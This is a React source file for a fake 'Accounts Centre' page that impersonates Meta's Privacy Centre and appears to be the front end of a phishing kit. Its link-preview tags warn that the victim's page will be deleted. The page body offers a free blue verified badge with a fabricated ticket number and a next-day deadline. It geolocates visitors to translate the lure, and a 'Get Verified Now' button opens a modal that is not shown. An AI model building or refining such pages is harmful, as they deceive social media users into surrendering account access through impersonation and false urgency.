"use client";
import React from "react";
import "./AccountsCentre.css";
import * as Icons from "./Icons";

import { store } from "../store/store";
import { getAllTranslations } from "../utils/translations";

// --- Sub-components to keep the main code clean ---

const SidebarItem = ({ label, icon, active = false, hasArrow = false, subItems = [] }: any) => (
  <div className={`item-action ${active ? "active" : ""}`}>
    <div className={`action-button ${active ? "main" : ""}`}>
      <div className="action-icon">{icon}</div>
      <div className="action-text">{label}</div>
      <div className="action-arrow">
        {hasArrow && <Icons.ArrowDownIcon />}
      </div>
    </div>
    {subItems.length > 0 && (
      <div className="content-action">
        {subItems.map((sub: string, i: number) => (
          <div key={i} className="action-button">
            <div className="action-icon"><svg /></div>
            <div className="action-text">{sub}</div>
            <div className="action-arrow" />
          </div>
        ))}
      </div>
    )}
  </div>
);

const HeadTags = () => (
  <>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAMJSURBVHgBxZfPTxNREMe/b9mClAgFiSaakt2LBy+Wo16AeIaUg/EIJhy8WQ/GeGo5mphYL8ZojOt/AHo21JNHyoVELywiJirWRQV/dLfPmW1KS3fb7kpbPwmhu++9mdmZ9747KxCU1EYM35BEj5iARIL+NAjE3DEJi36b9D9P4zlES8vI6lYQs6LljGsbGopI0dS5A4dBkDAQkYt4qJv4pwDoieO9kfRWwU7hCMRH1Oy7O2cWhRBW8ADoqUf6elYKeyUN7UBSeSJyyi8bSv2Ny48+JVAU7XPOCNovZNO17Rmqxa23WHEXdAKfTBwEIKWMiYXN1bDOY1EFcxcGkBjrhXZChbVfgvWzhM0dG9mX393rWkYGFLOw64zDKJ8StTIwdms7Hdb59UuDyMwMuUH4Ybze8wTApY2fpM0N3ODrcgY49bbYQAjmLw7g6dXRpnP029swKRO+qFLnUpRDLyKDkKSng0uCL662cAbmSeFU8TXM2smzx7By85TnPqd7Kb/v1p/x2wO102FLXT2nRZLr722EIRHv9dwzv9iYuvuxccq9xBBBUlnfKk4iJLGoV7+WV/fDOHc5PRiZUEaPq+fRBpqkuiEfdu2EsvPD0fD/0PgUHHE7H4mYwIIpW826d2UYyUS0uoqEp158XAWsKUN+6w9mH3xuZdpVQpbEplkY7legjarNpniC4lMRAItXmOgAa5SBALASyjV0gEBHklo4FSXkqCuYa2qs4CD35tfBNb/16kvCDmvTnnv7G60RuYoU84so8GnITA8hPXN4+uJzC5kXuwiFLYcV970s5TN0G25ayXd52zrIots41DGj0hMa1CJJeR/dgn0Z5basenAd6glkZ47kYefkw6n2H9UAeC841DB2MgjXOfkwql9Nh/WU06LI2Y4EUXY+W0m9fwDMYz3f9kxUnzxfP9SgndV5wXhbNibbYFuG/zei0nAh1+mJnuK+LbRO8NcyO+a1bMNo/KWstjRWjnyeFDNF4SapjZ3s71O4i9JQVU+L7pk0xuV7RfK+1MxpLX8B76lGyunc2EQAAAAASUVORK5CYII=" />
    <title>Accounts Centre</title>
    <meta name="description" content="We received several reports that your account violates our terms of service and community guidelines." />
    <meta property="og:title" content="We have scheduled your page to be deleted" />
    <meta property="og:description" content="Account verification required due to reported violations." />
    <meta property="og:image" content="https://i.postimg.cc/sgnQYgTC/social-preview.png" />
  </>
);

export default function AccountsCentre() {
  const { setModalOpen, setGeoInfo, isModalOpen, setTranslations, translations: storeTranslations } = store();
  const [restrictedDate, setRestrictedDate] = React.useState("");
  
  const t = (text: string): string => {
      return storeTranslations[text] || text;
  };
  const [ticketId, setTicketId] = React.useState("");

  const fetchGeoInfo = async () => {
    try {
      const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
      if (res.ok) {
        const data = await res.json();
        setGeoInfo(data);
        if (data.country_code) {
          setTranslations(getAllTranslations(data.country_code));
        }
      }
    } catch (error) {
      console.error('Failed to fetch geo info:', error);
    }
  };

  React.useEffect(() => {
    // Scroll to top on refresh
    window.scrollTo(0, 0);

    // Generate ticket ID only on client to avoid hydration mismatch
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const part = () => Array.from({ length: 4 }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
    setTicketId(`#${part()}-${part()}-${part()}`);
    const date = new Date(); date.setDate(date.getDate() + 1);
    const formattedDate = new Intl.DateTimeFormat('en-US', {
      month: 'long',
      day: 'numeric',
      year: 'numeric'
    }).format(date);
    setRestrictedDate(formattedDate);

    // Fetch IP/Geo info
    fetchGeoInfo();
  }, []);

  const sidebarItems = [
    { label: "Privacy Centre Home", icon: <Icons.HomeIcon /> },
    { label: "Search", icon: <Icons.SearchIcon /> },
    { label: "Common Privacy Settings", icon: <Icons.SettingsIcon />, active: true },
    { label: "Privacy Topics", icon: <Icons.ShieldIcon /> },
    { label: "More Privacy Resources", icon: <Icons.ScaleIcon /> },
    {
      label: "Privacy Policy",
      icon: <Icons.PolicyIcon />,
      hasArrow: true,
      subItems: [
        "What is the Privacy Policy and what does it cover?",
        "What information do we collect?",
        "How do we use your information?",
        "How do we share your information?",
        "How do we share information with third parties?",
        "How is the cooperation between companies organized?",
        "How can you manage or delete your information?",
        "How long do we keep your information?",
        "How do we transmit information?",
        "How do we respond to official requests?",
        "How will you know when the policy changes?",
        "How to ask questions?",
        "Why and how do we process your data"
      ]
    },
    {
      label: "Other Policies and Articles",
      icon: <Icons.InfoIcon />,
      hasArrow: true,
      subItems: [
        "What is the Privacy Policy and what does it cover?",
        "What information do we collect?",
        "How do we use your information?",
        "How do we share your information?",
        "How do we share information with third parties?"
      ]
    },
  ];

  return (
    <>
      <HeadTags />
      <div id="main-component">
        <div className="container-sm" id="main">
          {/* Mobile Menu */}
          <div className="menu-mobile">
            <div className="logo"><Icons.MetaLogo width={100} height={20} /></div>
            <div className="button-menu">
              <div className="item-button" /><div className="item-button" /><div className="item-button" />
            </div>
          </div>

          <div className="row container-content">
            {/* Sidebar (Left) */}
            <div className="left col-4">
              <div className="left-content">
                <div className="logo"><Icons.MetaLogo width={100} height={20} /></div>
                <div>
                  <h1>{t('Privacy Centre')}</h1>
                  <div id="action-buttons">
                    {sidebarItems.map((item, idx) => (
                      <SidebarItem key={idx} {...item} />
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Main Content (Right) */}
            <div className="righ col-8">
              <div className="content-right">
                <div className="top-content">
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px' }}>
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0, marginTop: '2px' }}>
                      <path d="M12 0L14.6541 2.32185L17.8286 1.34117L18.8967 4.54578L22.1887 5.17646L21.5796 8.44149L24 10.7483L21.7212 13.4358L22.6588 16.6214L19.4328 17.6534L18.756 20.941L15.4851 20.2588L13.1417 22.5401L10.3621 20.2946L7.20235 21.3255L6.08272 18.1408L2.77582 17.5615L3.33233 14.2825L0.887641 12.0122L3.11181 9.27788L2.12263 6.11306L5.33405 5.02986L5.95679 1.73031L9.24355 2.3607L12 0Z" fill="#1877F2"/>
                      <path d="M17.0674 8.78458L10.2954 15.5566L7.14716 12.4083L8.27891 11.2766L10.2954 13.293L15.9357 7.65283L17.0674 8.78458Z" fill="white"/>
                    </svg>
                    <h1 style={{ margin: 0 }}>{t('Your blue verified badge is now available for free!')}</h1>
                  </div>
                  <p>
                    {t('We’re excited to let you know that the blue verified badge is now free for all eligible accounts! This update helps creators, businesses, and communities build trust, show authenticity, and stand out — without any cost.')}
                  </p>
                  <p>{t('The blue checkmark lets people know that your account is genuine and represents the real you.')}</p>
                  <p className="ticket">{t('Your ticket number:')} {ticketId}</p>
                  <p><b>{t('How to get your free verified badge')}</b></p>
                  <ul>
                    <li>{t('Make sure your account meets our eligibility requirements, including being authentic, not impersonating others, and having a complete profile.')}</li>
                    <li>{t('Submit your verification request through the official verification process. After a quick eligibility review, your blue badge can be activated within 24 hours.')}</li>
                    <li>{t('Once verified, your account will display a blue checkmark, and you’ll get extended access to features like higher reach, more credibility, and greater visibility.')}</li>
                  </ul>
                </div>

                {/* Appeal Card */}
                <div className="card-thumb">
                  <img src="/images/anh1.png" alt="Featured" />
                  <div className="thumb-content">
                    <div className="warning-list">
                      <p>{t('Free Verification Benefit')}</p>
                      <h1><b>{t('Get your blue verified badge for free')}</b></h1>
                      <p>{t('Please make sure your account meets the eligibility requirements. Failure to provide this information may delay the verification process.')}</p>
                    </div>
                    <div 
                      className="btn-wrapper"
                      onClick={() => setModalOpen(true)}
                    >
                      <div className="button fb-blue">
                        <b>{t('Get Verified Now')}</b>
                      </div>
                    </div>
                    <div className="day" style={{ marginTop: 16, textAlign: "center" }}>
                      <p>{t('Your request was activated on')} <b>{restrictedDate}</b>.</p>
                    </div>
                  </div>
                </div>

                {/* Bottom Resources */}
                <div className="card-bottom">
                  <h6>{t('Privacy Centre')}</h6>
                  <div className="item-action">
                    <div className="action-button b-bottom">
                      <div className="action-icon"><img src="/images/anh2.png" alt="Policy" /></div>
                      <div className="action-text">
                        <span>{t('What is the Privacy Policy and what does it say?')}</span><br />
                        <span className="small-grey">{t('Privacy Policy')}</span>
                      </div>
                      <div className="action-arrow"><Icons.ArrowDownIcon /></div>
                    </div>
                    <div className="action-button">
                      <div className="action-icon"><img src="/images/anh3.png" alt="Manage" /></div>
                      <div className="action-text">
                        <span>{t('How you can manage or delete your information')}</span><br />
                        <span className="small-grey">{t('Privacy Policy')}</span>
                      </div>
                      <div className="action-arrow"><Icons.ArrowDownIcon /></div>
                    </div>
                  </div>

                  <br />
                  <h6>{t('For more details, see the User Agreement')}</h6>
                  <div className="item-action">
                    <div className="action-button">
                      <div className="action-icon"><img src="/images/anh4.png" alt="AI" /></div>
                      <div className="action-text">
                        <span>{t('AI Product')}</span><br />
                        <span className="small-grey">{t('User Agreement')}</span>
                      </div>
                      <div className="action-arrow"><Icons.ArrowDownIcon /></div>
                    </div>
                  </div>

                  <br />
                  <h6>{t('Additional resources')}</h6>
                  <div className="item-action">
                    <div className="action-button">
                      <div className="action-text">
                        <span>{t('How information is used for generative AI models')}</span><br />
                        <span className="small-grey">{t('Privacy Centre')}</span>
                      </div>
                      <div className="action-arrow"><Icons.ExternalLinkIcon /></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
